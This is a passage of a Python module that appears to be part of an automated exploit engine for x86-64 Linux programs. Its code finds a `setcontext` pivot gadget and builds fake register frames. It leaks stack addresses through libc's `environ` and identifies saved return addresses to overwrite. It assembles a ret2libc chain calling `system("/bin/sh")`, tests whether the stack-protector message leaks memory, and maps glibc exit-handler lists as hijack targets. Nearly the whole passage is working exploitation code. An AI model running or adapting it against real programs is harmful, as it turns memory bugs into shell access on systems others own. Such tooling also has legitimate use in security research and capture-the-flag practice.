    `rip_at` is the offset whose word `setcontext` PUSHES before returning -- i.e. where execution
    continues. Found as the `mov rcx, [rdx+disp]` immediately before the `push rcx` rather than
    assumed, for the same reason as the rest.
    """
    syms = libc_symbols(libc_data, ("setcontext",))
    base = syms.get("setcontext")
    if base is None:
        return {}
    segs = _loads(libc_data)
    off = None
    for f_off, sz, va, _fl in segs:
        if va <= base < va + sz:
            off = f_off + (base - va)
            break
    if off is None:
        return {}
    window = libc_data[off:off + 512]
    fields: dict = {}
    entry = None
    rip_at = None
    i = 0
    while i < len(window) - 4:
        rex = window[i]
        if rex not in (0x48, 0x4C) or window[i + 1] != 0x8B:
            if window[i] == 0xC3 and fields:              # ret: the load sequence is over
                break
            i += 1
            continue
        modrm = window[i + 2]
        if (modrm & 0x07) != 0x02:                        # rm must be rdx
            i += 1
            continue
        mod = modrm >> 6
        reg = (modrm >> 3) & 0x07
        name = _SETCTX_REGS[reg] if rex == 0x48 else f"r{8 + reg}"
        if mod == 0x01:
            disp = window[i + 3]
            step = 4
        elif mod == 0x02:
            disp = int.from_bytes(window[i + 3:i + 7], "little")
            step = 7
        else:
            i += 1
            continue
        if name == "rsp" and entry is None:
            entry = base + i                              # the first rsp load: the usable entry
        if entry is not None:
            # `push rcx` (0x51) right after a `mov rcx,[rdx+d]` marks the continuation address.
            if name == "rcx" and window[i + step:i + step + 1] == b"\x51":
                rip_at = disp
            else:
                fields.setdefault(name, disp)
        i += step
    if entry is None or "rsp" not in fields:
        return {}
    return {"sym": base, "entry": entry, "fields": fields, "rip_at": rip_at}


def build_setcontext_frame(fields: dict, rip_at, *, rip: int, rsp: int, rdi: int = 0,
                           rsi: int = 0, rdx: int = 0, rcx: int = 0, size: int = 0x100) -> bytes:
    """The fake context `setcontext` reads: one structure, every register.

    Only the offsets this libc actually loads are written, so the frame cannot claim a register
    the installed `setcontext` does not restore. `rip` is the continuation address (the word the
    function pushes) and `rsp` the stack it switches to -- together they make this a register-load
    AND a pivot, which is why it finishes a one-write primitive that has no stack control at all.
    """
    buf = bytearray(b"\x00" * max(size, (max(list(fields.values()) + [rip_at or 0]) + 8)))

    def _w(at, val):
        if at is not None and 0 <= at <= len(buf) - 8:
            buf[at:at + 8] = struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    _w(fields.get("rsp"), rsp)
    _w(rip_at, rip)
    for name, val in (("rdi", rdi), ("rsi", rsi), ("rdx", rdx), ("rcx", rcx)):
        _w(fields.get(name), val)
    return bytes(buf)


# --- the stack, reached from libc's `environ` ----------------------------------------------------
# An arbitrary READ that discloses a libc base can also disclose a STACK address, because libc
# exports `environ` -- a `char **` whose VALUE is the envp array, which the kernel put on the
# initial stack. That turns "I can read and write anywhere" into "I can overwrite a saved return
# address", which is the one target that needs no FILE, no allocator state and no exit handler.
#
# The hard part is not getting a stack address, it is knowing WHICH word below it is a saved return
# address rather than a code pointer that happens to live in a local. The test used here is the one
# fact that distinguishes them and does not depend on the compiler: a saved return address is the
# address of the instruction AFTER a `call`, so the bytes immediately before it in the target's own
# image must decode as a call. Nothing about register allocation, frame layout or optimisation level
# changes that.
_CALL_SITE_MAX = 7                                       # longest indirect `call` we recognise


def _off_of(segs, vaddr: int, need_x: bool = False):
    """File offset of a vaddr, the inverse of `_va_of`."""
    for off, sz, va, flags in segs:
        if va <= vaddr < va + sz and (not need_x or (flags & 1)):
            return off + (vaddr - va)
    return None


def exec_range(data: bytes):
    """(lo, hi) spanning every executable PT_LOAD vaddr, or None. For a no-PIE binary this IS the
    runtime range of its code; for PIE the caller must add the disclosed load base."""
    segs = [s for s in _loads(data) if s[3] & 1]
    if not segs:
        return None
    return (min(va for _o, _s, va, _f in segs),
            max(va + sz for _o, sz, va, _f in segs))


def is_return_site(data: bytes, vaddr: int, *, load_base: int = 0) -> bool:
    """Whether `vaddr` is the address right after a `call` in this image -- i.e. whether a word
    equal to it on the stack is a SAVED RETURN ADDRESS rather than some other code pointer.

    Checks the two encodings that actually occur: `e8 rel32` (5 bytes, a direct call) and the
    `ff /2` family (`call rax`, `call [rip+disp]`, `call [rbx+8]` ... 2 to 7 bytes), the latter by
    looking for an `ff` whose ModRM reg field is 2. A function pointer stored in a local, a vtable
    entry read onto the stack and the GOT's own copies all fail this, which is the point."""
    segs = _loads(data)
    off = _off_of(segs, vaddr - load_base, need_x=True)
    if off is None or off < _CALL_SITE_MAX:
        return False
    if data[off - 5:off - 4] == b"\xe8":
        return True
    for back in range(2, _CALL_SITE_MAX + 1):            # ff /2: call r/m64
        if data[off - back] == 0xFF and ((data[off - back + 1] >> 3) & 7) == 2:
            return True
    return False


def libc_symbol_ranges(data: bytes, names) -> dict:
    """{name: (st_value, st_size)} for exported symbols -- `libc_symbols` with the size kept, which
    is what lets a leaked code pointer be tested for lying INSIDE a named function."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    want, out = set(names), {}
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                st_name, _i, _o2, st_shndx, st_value, st_size = struct.unpack_from(
                    endc + "IBBHQQ", data, o)
            else:
                st_name, st_value, st_size, _i, _o2, st_shndx = struct.unpack_from(
                    endc + "IIIBBH", data, o)
        except struct.error:
            break
        if st_shndx == 0 or not st_value:
            continue
        end = data.find(b"\x00", st[0] + st_name)
        nm = data[st[0] + st_name:end].decode("latin-1", "replace")
        if nm in want and nm not in out:
            out[nm] = (st_value, st_size)
    return out


def saved_return_slots(read_words, stack_hint: int, *, images, span: int = 0x400,
                       limit: int = 6, skip=()) -> list:
    """Walk DOWN from a disclosed stack address collecting SAVED RETURN ADDRESSES, outermost
    (highest address) first, as [(slot_addr, value, image_label)].

    `read_words(addr) -> iterable[int]` is the caller's arbitrary read, returning EVERY value the
    target could have printed for that word rather than one guess -- a decimal, a hex literal and
    each raw byte window all come back, and the return-site test is what picks between them, the
    same way every other predicate in this module is applied to a candidate list. `stack_hint` is
    typically the
    value of libc's `environ`, which the kernel placed near the stack's high end, so every live
    frame is below it. `images` is [(label, image_bytes, load_base, lo, hi)] -- the target and its
    libc both have to be offered, because which image a saved return points INTO depends entirely
    on where the program reads its input: a target whose menu loop lives in main has no
    target-code return address that is still live, and its only useful slot is main's own, which
    points into libc. `skip` is [(lo, hi)] of values to reject.

    Why the walk stops at `span` (0x400) rather than going deeper: the frames of whatever is
    reading our input sit BELOW main's, and anything written there is scribbled over by the next
    `printf`/`scanf` before the frame it belongs to ever returns -- measured, as a write that did
    not read back and a process that died at the trigger. The slots worth having are the outermost
    few, and they are within a few hundred bytes of `environ`."""
    out = []
    top = stack_hint & ~7
    for addr in range(top, max(top - span, 8), -8):
        hit = None
        for v in read_words(addr) or ():
            if any(lo <= v < hi for lo, hi in skip):
                continue
            for label, data, load_base, lo, hi in images:
                if lo <= v < hi and is_return_site(data, v, load_base=load_base):
                    hit = (addr, v, label)
                    break
            if hit:
                break
        if hit:
            out.append(hit)
            if len(out) >= limit:
                break
    return out


def main_return_images(target_bytes: bytes, libc_data: bytes, libc_base: int, *,
                       target_base: int = 0):
    """The (images, skip) pair for `saved_return_slots` when the goal is MAIN's saved return.

    `skip` excludes `__libc_start_main`'s own body, and that single exclusion is what makes the
    answer unambiguous. Below `environ` there are exactly two libc return addresses above main's
    frame: the one `_start` pushed (which points into the TARGET and belongs to a frame
    `__libc_start_main` never returns from) and the one `__libc_start_main` pushed when it called
    `__libc_start_call_main` (which points INSIDE `__libc_start_main`, and is equally dead,
    because `__libc_start_call_main` is noreturn). Main's own saved return points into
    `__libc_start_call_main`, which no libc exports -- but it is the first libc return site that is
    NOT inside `__libc_start_main`, and `__libc_start_main` is exported with its size."""
    lsm = libc_symbol_ranges(libc_data, ("__libc_start_main",)).get("__libc_start_main")
    tr = exec_range(target_bytes) or (0, 0)
    lr = exec_range(libc_data) or (0, 0)
    images = [("libc", libc_data, libc_base, libc_base + lr[0], libc_base + lr[1]),
              ("target", target_bytes, target_base,
               target_base + tr[0], target_base + tr[1])]
    skip = [(libc_base + lsm[0], libc_base + lsm[0] + (lsm[1] or 1))] if lsm else []
    return images, skip


def build_stack_ret2libc(*, pop_rdi: int, binsh: int, system: int, ret_gadget: int = 0) -> list:
    """The words to write over a saved return address so the frame's `ret` runs
    `system("/bin/sh")`: [pop rdi; ret][&"/bin/sh"][system]. Returned as a list so the caller can
    write them one at a time with whatever one-word write it has.

    Three words land at slot, slot+8 and slot+16 -- the second and third are inside the CALLER's
    frame, which is safe precisely because control never returns there once the first word is
    consumed. `ret_gadget` inserts an extra `ret` to fix rsp's 16-byte alignment when the movaps in
    system's prologue needs it."""
    chain = [pop_rdi, binsh]
    if ret_gadget:
        chain.insert(0, ret_gadget)
    chain.append(system)
    return chain


def environ_stack_targets(libc_data: bytes) -> dict:
    """What the `environ` route needs out of the libc the target links: the `environ` variable to
    read a stack address from, and the three pieces of a `system("/bin/sh")` chain to write over a
    saved return address. Empty if any is missing.

    `environ` is tried under all three exported spellings -- the weak `environ`, the global
    `__environ` and the historical `_environ` -- because which one a build exports is not fixed."""
    syms = libc_symbols(libc_data, ("environ", "__environ", "_environ", "system"))
    env = next((syms[n] for n in ("environ", "__environ", "_environ") if n in syms), None)
    pop_rdi = find_gadget(libc_data, "pop_rdi")
    binsh = find_string(libc_data, b"/bin/sh")
    if not (env and pop_rdi and binsh and "system" in syms):
        return {}
    return {"environ": env, "environ_name": next(n for n in ("environ", "__environ", "_environ")
                                                 if n in syms),
            "pop_rdi": pop_rdi, "binsh": binsh, "system": syms["system"],
            "ret": find_gadget(libc_data, "ret") or 0}


# --- the SSP message as a read oracle: a measured refusal -------------------------------------
#: `__fortify_fail`'s format string. The classic canary-era trick is to overwrite `argv[0]` with a
#: pointer and let `__stack_chk_fail` print what it points at -- an arbitrary-read oracle that
#: exists only on canary-on targets, which is where a leak is hardest to come by. glibc removed
#: the program name from that message, so the trick is dead; the question is whether it is dead in
#: THIS libc, and the libc's own bytes answer it without a version table. The format carried
#: `*** %s ***: %s terminated\n` (two conversions: the reason, then `__libc_argv[0]`) and now
#: carries `*** %s ***: terminated\n` (one).
_SSP_FMT = b"*** %s ***"


def ssp_leak_feasible(libc_data: bytes) -> dict:
    """Whether `__stack_chk_fail`'s message still discloses `argv[0]`, decided by counting the
    conversions in `__fortify_fail`'s own format string.

    Returns {ok, conversions, format, reason}. `ok` is False when the message takes one argument
    (the reason alone), which means overwriting `argv[0]` discloses nothing and a canary-on target
    needs a different oracle -- an out-of-bounds read, a format string, or the byte-at-a-time
    canary brute a forking server allows. UNKNOWN (ok None) when handed no libc bytes, rather than
    defaulting to the historical answer."""
    if not libc_data:
        return {"ok": None, "conversions": 0, "format": "",
                "reason": "no libc bytes: whether the SSP message discloses argv[0] is unknown"}
    idx = libc_data.find(_SSP_FMT)
    if idx < 0:
        return {"ok": False, "conversions": 0, "format": "",
                "reason": "this libc has no `*** %s ***` fortify message at all"}
    end = libc_data.find(b"\x00", idx)
    fmt = libc_data[idx:end if end > idx else idx + 64]
    n = fmt.count(b"%s")
    return {"ok": n >= 2, "conversions": n, "format": fmt.decode("latin-1", "replace"),
            "reason": (f"{fmt.decode('latin-1', 'replace')!r} takes {n} conversions: "
                       + ("the second is `__libc_argv[0]`, so overwriting argv[0] with a pointer "
                          "makes __stack_chk_fail print what it points at"
                          if n >= 2 else
                          "the reason only -- glibc dropped `__libc_argv[0]` from the message, so "
                          "overwriting argv[0] discloses nothing"))}


# --- exit() as a control-flow endpoint ----------------------------------------------------------
# `exit()` walks a registered list of handlers and calls each, which is the one universal
# control-flow endpoint this engine does not model: every other route it has lands through stdio
# (FSOP) or a saved return address. A write-what-where that reaches the handler list is therefore
# a fourth way to turn a write into a call -- the one that works when the FILE structs are
# unreachable and there is no saved return to overwrite.
#
# The decisive, measured fact that makes this a CONDITIONAL verdict rather than an unconditional
# route: every handler flavor stores its function pointer under glibc's pointer guard, so the
# pointer cannot simply be overwritten with a target address -- the stored value has to be the
# guard-encoded form, and the guard is a per-process secret. `exit_handlers_targets` locates the
# machinery statically; `guard_demangle_sites` reports whether this libc actually guards (every
# modern one does), which is the precondition the knowledge base reports honestly.
_GUARD_DEMANGLE = bytes.fromhex("48c1c811" + "644833042530000000")  # ror rax,0x11 ; xor rax,fs:0x30


def guard_demangle_sites(libc_data: bytes) -> int:
    """How many times this libc demangles a guarded pointer with `ror 0x11; xor fs:0x30` -- the
    exact instruction pair glibc applies to a `PTR_MANGLE`'d code pointer before an indirect call.

    Read from the bytes, not from a version, for the same reason `guard_sites` counts jumps rather
    than trusting a table: a backport or a build change moves the fact, and only the binary knows.
    A count of zero would mean this libc does NOT guard exit-handler / TLS-dtor pointers, so the
    route would be an unconditional overwrite; every modern glibc returns a large positive count,
    which is what makes the guard a hard precondition."""
    if not libc_data:
        return 0
    n, i = 0, libc_data.find(_GUARD_DEMANGLE)
    while i >= 0:
        n += 1
        i = libc_data.find(_GUARD_DEMANGLE, i + 1)
    return n


def exit_handlers_targets(libc_data: bytes) -> dict:
    """Locate the `exit()` handler machinery from the libc's own bytes, with no backend and no
    version table. Returns {} when the libc is not understood.

    `exit()` loads the address of its handler list with a RIP-relative `lea rsi, [rip+disp32]`
    before it calls the walker, and `exit` is an exported symbol -- so the list's address is
    recoverable exactly, anchored on a symbol, the same way `find_setcontext` anchors on its own.
    The `exit_function` records are a `{next, idx}` header followed by 0x20-byte entries
    `{long flavor; void (*fn)(); void *arg; void *dso_handle;}` where `fn` is the guarded pointer.

    `guarded` reports whether this libc actually mangles those pointers (it reads
    `guard_demangle_sites`), because that is the precondition a consumer has to satisfy and the
    knowledge base reports. Returns the field offsets a write-what-where needs to target a handler,
    NOT a chain -- composing one is the caller's job and is gated on recovering the guard."""
    syms = libc_symbols(libc_data, ("exit",))
    if "exit" not in syms:
        return {}
    segs = _loads(libc_data)
    off = _off_of(segs, syms["exit"])
    if off is None:
        return {}
    body = libc_data[off:off + 48]
    exit_funcs = None
    for i in range(max(0, len(body) - 7)):
        if body[i] == 0x48 and body[i + 1] == 0x8D and body[i + 2] == 0x35:  # lea rsi,[rip+d]
            disp = struct.unpack_from("<i", body, i + 3)[0]
            exit_funcs = syms["exit"] + i + 7 + disp
            break
    if exit_funcs is None:
        return {}
    sites = guard_demangle_sites(libc_data)
    return {"exit": syms["exit"], "exit_funcs": exit_funcs,
            "header_next": 0x0, "header_idx": 0x8,          # struct exit_function_list
            "entry_stride": 0x20, "flavor_field": 0x0,      # struct exit_function
            "fn_field": 0x8, "arg_field": 0x10, "dso_field": 0x18,
            "flavor_onfn": 4,                               # ef_on: {fn, arg} are both used
            "guarded": sites > 0, "demangle_sites": sites}
